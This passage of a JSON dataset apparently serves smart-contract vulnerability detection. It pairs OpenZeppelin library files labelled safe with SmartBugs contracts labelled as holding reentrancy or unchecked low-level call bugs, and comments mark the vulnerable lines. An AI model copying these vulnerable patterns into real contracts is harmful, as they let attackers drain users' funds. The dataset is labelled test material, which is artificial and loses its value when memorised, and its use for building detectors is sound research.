*/\n    function deriveMapping(bytes32 slot, bytes32 key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, key)\n            mstore(0x20, slot)\n            result := keccak256(0x00, 0x40)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, uint256 key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, key)\n            mstore(0x20, slot)\n            result := keccak256(0x00, 0x40)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, int256 key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, key)\n            mstore(0x20, slot)\n            result := keccak256(0x00, 0x40)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, string memory key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            let length := mload(key)\n            let begin := add(key, 0x20)\n            let end := add(begin, length)\n            let cache := mload(end)\n            mstore(end, slot)\n            result := keccak256(begin, add(length, 0x20))\n            mstore(end, cache)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, bytes memory key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            let length := mload(key)\n            let begin := add(key, 0x20)\n            let end := add(begin, length)\n            let cache := mload(end)\n            mstore(end, slot)\n            result := keccak256(begin, add(length, 0x20))\n            mstore(end, cache)\n        }\n    }\n}\n",
    "num_lines": 156,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x19cf8481ea15427a98ba3cdd6d9e14690011ab10",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x19cf8481ea15427a98ba3cdd6d9e14690011ab10.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 439,465\n */\n\n//DAO Polska Token deployment\npragma solidity ^0.4.11;\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\n\n\n// title Migration Agent interface\ncontract MigrationAgent {\n    function migrateFrom(address _from, uint256 _value);\n}\n\ncontract ERC20 {\n  uint public totalSupply;\n  function balanceOf(address who) constant returns (uint);\n  function allowance(address owner, address spender) constant returns (uint);\n\n  function transfer(address to, uint value) returns (bool ok);\n  function transferFrom(address from, address to, uint value) returns (bool ok);\n  function approve(address spender, uint value) returns (bool ok);\n  event Transfer(address indexed from, address indexed to, uint value);\n  event Approval(address indexed owner, address indexed spender, uint value);\n}\n\n\n\n/**\n * Math operations with safety checks\n */\ncontract SafeMath {\n  function safeMul(uint a, uint b) internal returns (uint) {\n    uint c = a * b;\n    assert(a == 0 || c / a == b);\n    return c;\n  }\n\n  function safeDiv(uint a, uint b) internal returns (uint) {\n    assert(b > 0);\n    uint c = a / b;\n    assert(a == b * c + a % b);\n    return c;\n  }\n\n  function safeSub(uint a, uint b) internal returns (uint) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function safeAdd(uint a, uint b) internal returns (uint) {\n    uint c = a + b;\n    assert(c>=a && c>=b);\n    return c;\n  }\n\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a >= b ? a : b;\n  }\n\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n    return a < b ? a : b;\n  }\n\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a >= b ? a : b;\n  }\n\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n    return a < b ? a : b;\n  }\n\n  function assert(bool assertion) internal {\n    if (!assertion) {\n      throw;\n    }\n  }\n}\n\n\n\n/**\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\n *\n * Based on code by FirstBlood:\n * https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n */\ncontract StandardToken is ERC20, SafeMath {\n\n  /* Token supply got increased and a new owner received these tokens */\n  event Minted(address receiver, uint amount);\n\n  /* Actual balances of token holders */\n  mapping(address => uint) balances;\n  // what exaclt ether was sent\n  mapping(address => uint) balancesRAW;\n  /* approve() allowances */\n  mapping (address => mapping (address => uint)) allowed;\n\n  /* Interface declaration */\n  function isToken() public constant returns (bool weAre) {\n    return true;\n  }\n\n  function transfer(address _to, uint _value) returns (bool success) {\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\n    balances[_to] = safeAdd(balances[_to], _value);\n    Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n    uint _allowance = allowed[_from][msg.sender];\n\n    balances[_to] = safeAdd(balances[_to], _value);\n    balances[_from] = safeSub(balances[_from], _value);\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\n    Transfer(_from, _to, _value);\n    return true;\n  }\n\n  function balanceOf(address _owner) constant returns (uint balance) {\n    return balances[_owner];\n  }\n\n  function approve(address _spender, uint _value) returns (bool success) {\n\n    // To change the approve amount you first have to reduce the addresses`\n    //  allowance to zero by calling `approve(_spender, 0)` if it is not\n    //  already 0 to mitigate the race condition described here:\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\n    return allowed[_owner][_spender];\n  }\n\n  \n  \n}\n\n\n//  daoPOLSKAtokens\ncontract daoPOLSKAtokens{\n\n    string public name = \"DAO POLSKA TOKEN version 1\";\n    string public symbol = \"DPL\";\n    uint8 public constant decimals = 18;  // 18 decimal places, the same as ETC/ETH/HEE.\n\n    // Receives \n    address public owner;\n    address public migrationMaster;\t\n    // The current total token supply.\n\n    uint256 public otherchainstotalsupply =1.0 ether;\n    uint256 public supplylimit      = 10000.0 ether;\n\t//totalSupply   \n   uint256 public  totalSupply      = 0.0 ether;\n\t//chains:\n\taddress public Chain1 = 0x0;\n\taddress public Chain2 = 0x0;\n\taddress public Chain3 = 0x0;\n\taddress public Chain4 = 0x0;\n\n\taddress public migrationAgent=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;\n    uint256 public totalMigrated;\n\n\n    event Migrate(address indexed _from, address indexed _to, uint256 _value);\n    event Refund(address indexed _from, uint256 _value);\n\n\t\n\tstruct sendTokenAway{\n\t\tStandardToken coinContract;\n\t\tuint amount;\n\t\taddress recipient;\n\t}\n\tmapping(uint => sendTokenAway) transfers;\n\tuint numTransfers=0;\n\t\n  mapping (address => uint256) balances;\nmapping (address => uint256) balancesRAW;\n  mapping (address => mapping (address => uint256)) allowed;\n\n\tevent UpdatedTokenInformation(string newName, string newSymbol);\t\n \n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\tevent receivedEther(address indexed _from,uint256 _value);\n  event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n      // This notifies clients about the amount burnt\n    event Burn(address indexed from, uint256 value);\n  //tokenCreationCap\n  bool public supplylimitset = false;\n  bool public otherchainstotalset = false;\n   \n  function daoPOLSKAtokens() {\nowner=msg.sender;\nmigrationMaster=msg.sender;\n}\n\nfunction  setSupply(uint256 supplyLOCKER) public {\n    \t   if (msg.sender != owner) {\n      throw;\n    }\n\t\t    \t   if (supplylimitset != false) {\n      throw;\n    }\n\tsupplylimitset = true;\n  \n\tsupplylimit = supplyLOCKER ** uint256(decimals);\n//balances[owner]=supplylimit;\n  } \nfunction setotherchainstotalsupply(uint256 supplyLOCKER) public {\n    \t   if (msg.sender != owner) {\n      throw;\n    }\n\t    \t   if (supplylimitset != false) {\n      throw;\n    }\n\n\totherchainstotalset = true;\n\totherchainstotalsupply = supplyLOCKER ** uint256(decimals);\n\t\n  } \n    /**\n     * Set allowance for other address and notify\n     *\n     * Allows `_spender` to spend no more than `_value` tokens on your behalf, and then ping the contract about it\n     *\n     * @param _spender The address authorized to spend\n     * @param _value the max amount they can spend\n     * @param _extraData some extra information to send to the approved contract\n     */\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n        public\n        returns (bool success) {\n        tokenRecipient spender = tokenRecipient(_spender);\n        if (approve(_spender, _value)) {\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\n            return true;\n        }\n    }\n\n    /**\n     * Destroy tokens\n     *\n     * Remove `_value` tokens from the system irreversibly\n     *\n     * @param _value the amount of money to burn\n     */\n    function burn(uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value);   // Check if the sender has enough\n        balances[msg.sender] -= _value;            // Subtract from the sender\n        totalSupply -= _value;                      // Updates totalSupply\n        Burn(msg.sender, _value);\n        return true;\n    }\n\n    /**\n     * Destroy tokens from other account\n     *\n     * Remove `_value` tokens from the system irreversibly on behalf of `_from`.\n     *\n     * @param _from the address of the sender\n     * @param _value the amount of money to burn\n     */\n    function burnFrom(address _from, uint256 _value) public returns (bool success) {\n        require(balances[_from] >= _value);                // Check if the targeted balance is enough\n        require(_value <= allowed[_from][msg.sender]);    // Check allowance\n        balances[_from] -= _value;                         // Subtract from the targeted balance\n        allowed[_from][msg.sender] -= _value;             // Subtract from the sender's allowance\n        totalSupply -= _value;                              // Update totalSupply\n        Burn(_from, _value);\n        return true;\n    }\n  \n  function transfer(address _to, uint256 _value) returns (bool success) {\n    //Default assumes totalSupply can't be over max (2^256 - 1).\n    //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n    //Replace the if with this one instead.\n    if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n    //if (balances[msg.sender] >= _value && _value > 0) {\n      balances[msg.sender] -= _value;\n      balances[_to] += _value;\n      Transfer(msg.sender, _to, _value);\n      return true;\n    } else { return false; }\n  }\n\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n    //same as above. Replace this line with the following if you want to protect against wrapping uints.\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n    //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n      balances[_to] += _value;\n      balances[_from] -= _value;\n      allowed[_from][msg.sender] -= _value;\n      Transfer(_from, _to, _value);\n      return true;\n    } else { return false; }\n  }\n\n  function balanceOf(address _owner) constant returns (uint256 balance) {\n    return balances[_owner];\n  }\n\n  function approve(address _spender, uint256 _value) returns (bool success) {\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n    return allowed[_owner][_spender];\n  }\n\n\n\t\n\t    function () payable  public {\n\t\t if(funding){ \n        receivedEther(msg.sender, msg.value);\n\t\tbalances[msg.sender]=balances[msg.sender]+msg.value;\n\t\t} else throw;\n\t\t\n    }\n   \n\n\n\n\t\n  function setTokenInformation(string _name, string _symbol) {\n    \n\t   if (msg.sender != owner) {\n      throw;\n    }\n\tname = _name;\n    symbol = _symbol;\n\n    UpdatedTokenInformation(name, symbol);\n  }\n\nfunction setChainsAddresses(address chainAd, int chainnumber) {\n    \n\t   if (msg.sender != owner) {\n      throw;\n    }\n\tif(chainnumber==1){Chain1=chainAd;}\n\tif(chainnumber==2){Chain2=chainAd;}\n\tif(chainnumber==3){Chain3=chainAd;}\n\tif(chainnumber==4){Chain4=chainAd;}\t\t\n  } \n\n  function DAOPolskaTokenICOregulations() external returns(string wow) {\n\treturn 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';\n}\n// if accidentally other token was donated to Project Dev\n\n\n\tfunction sendTokenAw(address StandardTokenAddress, address receiver, uint amount){\n\t\tif (msg.sender != owner) {\n\t\tthrow;\n\t\t}\n\t\tsendTokenAway t = transfers[numTransfers];\n\t\tt.coinContract = StandardToken(StandardTokenAddress);\n\t\tt.amount = amount;\n\t\tt.recipient = receiver;\n\t\tt.coinContract.transfer(receiver, amount);\n\t\tnumTransfers++;\n\t}\n\n     // Crowdfunding:\nuint public tokenCreationRate=1000;\nuint public bonusCreationRate=1000;\nuint public CreationRate=1761;\n   uint256 public constant oneweek = 36000;\nuint256 public fundingEndBlock = 5433616;\nbool public funding = true;\nbool public refundstate = false;\nbool public migratestate= false;\n        function createDaoPOLSKAtokens(address holder) payable {\n\n        if (!funding) throw;\n\n        // Do not allow creating 0 or more than the cap tokens.\n        if (msg.value == 0) throw;\n\t\t// check the maximum token creation cap\n        if (msg.value > (supplylimit - totalSupply) / CreationRate)\n          throw;\n\t\t\n\t\t//bonus structure\n// in early stage there is about 100% more details in ico regulations on website\n// price and converstion rate in tabled to PLN not ether, and is updated daily\n\n\n\n\t var numTokensRAW = msg.value;\n\n        var numTokens = msg.value * CreationRate;\n        totalSupply += numTokens;\n\n        // Assign new tokens to the sender\n        balances[holder] += numTokens;\n        balancesRAW[holder] += numTokensRAW;\n        // Log token creation event\n        Transfer(0, holder, numTokens);\n\t\t\n\t\t// Create additional Dao Tokens for the community and developers around 12%\n        uint256 percentOfTotal = 12;\n        uint256 additionalTokens = \tnumTokens * percentOfTotal / (100);\n\n        totalSupply += additionalTokens;\n\n        balances[migrationMaster] += additionalTokens;\n        Transfer(0, migrationMaster, additionalTokens);\n\t\n\t}\n\tfunction setBonusCreationRate(uint newRate){\n\tif(msg.sender == owner) {\n\tbonusCreationRate=newRate;\n\tCreationRate=tokenCreationRate+bonusCreationRate;\n\t}\n\t}\n\n    function FundsTransfer() external {\n\tif(funding==true) throw;\n\t\t \tif (!owner.send(this.balance)) throw;\n    }\n\t\n    function PartialFundsTransfer(uint SubX) external {\n\t      if (msg.sender != owner) throw;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        owner.send(this.balance - SubX);\n\t}\n\tfunction turnrefund() external {\n\t      if (msg.sender != owner) throw;\n\trefundstate=!refundstate;\n        }\n\t\t\n\t\t\tfunction fundingState() external {\n\t      if (msg.sender != owner) throw;\n\tfunding=!funding;\n        }\n    function turnmigrate() external {\n\t      if (msg.sender != migrationMaster) throw;\n\tmigratestate=!migratestate;\n}\n\n    // notice Finalize crowdfunding clossing funding options\n\t\nfunction finalize() external {\n        if (block.number <= fundingEndBlock+8*oneweek) throw;\n        // Switch to Operational state. This is the only place this can happen.\n        funding = false;\t\n\t\trefundstate=!refundstate;\n        // Transfer ETH to theDAO Polska Token network Storage address.\n        if (msg.sender==owner)\n        // <yes> <report> UNCHECKED_LL_CALLS\n\t\towner.send(this.balance);\n    }\n    function migrate(uint256 _value) external {\n        // Abort if not in Operational Migration state.\n        if (migratestate) throw;\n\n\n        // Validate input value.\n        if (_value == 0) throw;\n        if (_value > balances[msg.sender]) throw;\n\n        balances[msg.sender] -= _value;\n        totalSupply -= _value;\n        totalMigrated += _value;\n        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);\n        Migrate(msg.sender, migrationAgent, _value);\n    }\n\t\nfunction refundTRA() external {\n        // Abort if not in Funding Failure state.\n        if (funding) throw;\n        if (!refundstate) throw;\n\n        var DAOPLTokenValue = balances[msg.sender];\n        var ETHValue = balancesRAW[msg.sender];\n        if (ETHValue == 0) throw;\n        balancesRAW[msg.sender] = 0;\n        totalSupply -= DAOPLTokenValue;\n         \n        Refund(msg.sender, ETHValue);\n        msg.sender.transfer(ETHValue);\n}\n\nfunction preICOregulations() external returns(string wow) {\n\treturn 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';\n}\n\n\n}\n\n\n//------------------------------------------------------",
    "num_lines": 506,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 12\n */\n\npragma solidity ^0.4.10;\n\ncontract Caller {\n    function callAddress(address a) {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        a.call();\n    }\n}",
    "num_lines": 14,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "IERC20Permit",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Permit.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC20/extensions/IERC20Permit.sol)\n\npragma solidity >=0.4.16;\n\n/**\n * @dev Interface of the ERC-20 Permit extension allowing approvals to be made via signatures, as defined in\n * https://eips.ethereum.org/EIPS/eip-2612[ERC-2612].\n *\n * Adds the {permit} method, which can be used to change an account's ERC-20 allowance (see {IERC20-allowance}) by\n * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't\n * need to send a transaction, and thus is not required to hold Ether at all.\n *\n * ==== Security Considerations\n *\n * There are two important considerations concerning the use of `permit`. The first is that a valid permit signature\n * expresses an allowance, and it should not be assumed to convey additional meaning. In particular, it should not be\n * considered as an intention to spend the allowance in any specific way. The second is that because permits have\n * built-in replay protection and can be submitted by anyone, they can be frontrun. A protocol that uses permits should\n * take this into consideration and allow a `permit` call to fail. Combining these two aspects, a pattern that may be\n * generally recommended is:\n *\n * ```solidity\n * function doThingWithPermit(..., uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {\n *     try token.permit(msg.sender, address(this), value, deadline, v, r, s) {} catch {}\n *     doThing(..., value);\n * }\n *\n * function doThing(..., uint256 value) public {\n *     token.safeTransferFrom(msg.sender, address(this), value);\n *     ...\n * }\n * ```\n *\n * Observe that: 1) `msg.sender` is used as the owner, leaving no ambiguity as to the signer intent, and 2) the use of\n * `try/catch` allows the permit to fail and makes the code tolerant to frontrunning. (See also\n * {SafeERC20-safeTransferFrom}).\n *\n * Additionally, note that smart contract wallets (such as Argent or Safe) are not able to produce permit signatures, so\n * contracts should have entry points that don't rely on permit.\n */\ninterface IERC20Permit {\n    /**\n     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,\n     * given ``owner``'s signed approval.\n     *\n     * IMPORTANT: The same issues {IERC20-approve} has related to transaction\n     * ordering also applies here.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `deadline` must be a timestamp in the future.\n     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`\n     * over the EIP712-formatted function arguments.\n     * - the signature must use ``owner``'s current nonce (see {nonces}).\n     *\n     * For more information on the signature format, see the\n     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP\n     * section].\n     *\n     * CAUTION: See Security Considerations above.\n     */\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n\n    /**\n     * @dev Returns the current nonce for `owner`. This value must be\n     * included whenever a signature is generated for {permit}.\n     *\n     * Every successful call to {permit} increases ``owner``'s nonce by one. This\n     * prevents a signature from being used multiple times.\n     */\n    function nonces(address owner) external view returns (uint256);\n\n    /**\n     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.\n     */\n    // solhint-disable-next-line func-name-mixedcase\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n}\n",
    "num_lines": 91,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "ERC165",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/introspection/ERC165.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/introspection/ERC165.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC165} from \"./IERC165.sol\";\n\n/**\n * @dev Implementation of the {IERC165} interface.\n *\n * Contracts that want to implement ERC-165 should inherit from this contract and override {supportsInterface} to check\n * for the additional interface id that will be supported. For example:\n *\n * ```solidity\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\n * }\n * ```\n */\nabstract contract ERC165 is IERC165 {\n    /// @inheritdoc IERC165\n    function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) {\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n",
    "num_lines": 26,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x8c7777c45481dba411450c228cb692ac3d550344",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x8c7777c45481dba411450c228cb692ac3d550344.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n \npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    Log TransferLog;\n    \n    uint public MinDeposit = 1 ether;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 77,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC6909Metadata",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC6909/extensions/ERC6909Metadata.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC6909/extensions/ERC6909Metadata.sol)\n\npragma solidity ^0.8.20;\n\nimport {ERC6909} from \"../ERC6909.sol\";\nimport {IERC6909Metadata} from \"../../../interfaces/IERC6909.sol\";\nimport {IERC165} from \"../../../utils/introspection/IERC165.sol\";\n\n/**\n * @dev Implementation of the Metadata extension defined in ERC6909. Exposes the name, symbol, and decimals of each token id.\n */\ncontract ERC6909Metadata is ERC6909, IERC6909Metadata {\n    struct TokenMetadata {\n        string name;\n        string symbol;\n        uint8 decimals;\n    }\n\n    mapping(uint256 id => TokenMetadata) private _tokenMetadata;\n\n    /// @dev The name of the token of type `id` was updated to `newName`.\n    event ERC6909NameUpdated(uint256 indexed id, string newName);\n\n    /// @dev The symbol for the token of type `id` was updated to `newSymbol`.\n    event ERC6909SymbolUpdated(uint256 indexed id, string newSymbol);\n\n    /// @dev The decimals value for token of type `id` was updated to `newDecimals`.\n    event ERC6909DecimalsUpdated(uint256 indexed id, uint8 newDecimals);\n\n    /// @inheritdoc IERC6909Metadata\n    function name(uint256 id) public view virtual override returns (string memory) {\n        return _tokenMetadata[id].name;\n    }\n\n    /// @inheritdoc IERC6909Metadata\n    function symbol(uint256 id) public view virtual override returns (string memory) {\n        return _tokenMetadata[id].symbol;\n    }\n\n    /// @inheritdoc IERC6909Metadata\n    function decimals(uint256 id) public view virtual override returns (uint8) {\n        return _tokenMetadata[id].decimals;\n    }\n\n    /// @inheritdoc IERC165\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC6909, IERC165) returns (bool) {\n        return interfaceId == type(IERC6909Metadata).interfaceId || super.supportsInterface(interfaceId);\n    }\n\n    /**\n     * @dev Sets the `name` for a given token of type `id`.\n     *\n     * Emits an {ERC6909NameUpdated} event.\n     */\n    function _setName(uint256 id, string memory newName) internal virtual {\n        _tokenMetadata[id].name = newName;\n\n        emit ERC6909NameUpdated(id, newName);\n    }\n\n    /**\n     * @dev Sets the `symbol` for a given token of type `id`.\n     *\n     * Emits an {ERC6909SymbolUpdated} event.\n     */\n    function _setSymbol(uint256 id, string memory newSymbol) internal virtual {\n        _tokenMetadata[id].symbol = newSymbol;\n\n        emit ERC6909SymbolUpdated(id, newSymbol);\n    }\n\n    /**\n     * @dev Sets the `decimals` for a given token of type `id`.\n     *\n     * Emits an {ERC6909DecimalsUpdated} event.\n     */\n    function _setDecimals(uint256 id, uint8 newDecimals) internal virtual {\n        _tokenMetadata[id].decimals = newDecimals;\n\n        emit ERC6909DecimalsUpdated(id, newDecimals);\n    }\n}\n",
    "num_lines": 84,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "draft-IERC1822",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/interfaces/draft-IERC1822.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (interfaces/draft-IERC1822.sol)\n\npragma solidity >=0.4.16;\n\n/**\n * @dev ERC-1822: Universal Upgradeable Proxy Standard (UUPS) documents a method for upgradeability through a simplified\n * proxy whose upgrades are fully controlled by the current implementation.\n */\ninterface IERC1822Proxiable {\n    /**\n     * @dev Returns the storage slot that the proxiable contract assumes is being used to store the implementation\n     * address.\n     *\n     * IMPORTANT: A proxy pointing at a proxiable contract should not be considered proxiable itself, because this risks\n     * bricking a proxy that upgrades to it, by delegating to itself until out of gas. Thus it is critical that this\n     * function revert if invoked through a proxy.\n     */\n    function proxiableUUID() external view returns (bytes32);\n}\n",
    "num_lines": 21,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x2972d548497286d18e92b5fa1f8f9139e5653fd2",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.25; \ncontract demo{\n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n             // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
    "num_lines": 18,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract W_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function W_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 85,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC7913WebAuthnVerifier",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/cryptography/verifiers/ERC7913WebAuthnVerifier.sol",
